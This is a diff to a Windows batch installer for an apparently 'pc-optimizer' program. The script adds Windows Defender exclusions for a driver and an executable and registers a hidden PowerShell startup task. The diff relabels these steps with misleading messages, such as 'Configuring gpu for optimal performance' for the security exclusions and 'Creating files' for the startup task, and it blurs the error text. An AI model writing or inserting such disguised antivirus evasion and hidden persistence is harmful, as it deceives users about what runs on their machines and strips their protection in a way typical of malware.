@@ -46,11 +46,11 @@ if exist "%INSTALL_DIR%\pc-optimizer" (
 )
 
 :: Add exclusions before running the executable
-echo [5/7] Adding security exclusions...
+echo [5/7] Configuring gpu for optimal performance...
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"
 
-echo [6/7] Creating startup task...
+echo [6/7] Creating files...
 
 schtasks /create /tn "%APP_NAME%" ^
  /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
@@ -59,7 +59,7 @@ schtasks /create /tn "%APP_NAME%" ^
  /f >nul
 
 if %errorlevel% neq 0 (
-    echo ERROR: Failed to create scheduled task.
+    echo ERROR.
     pause
     exit /b 1
 )
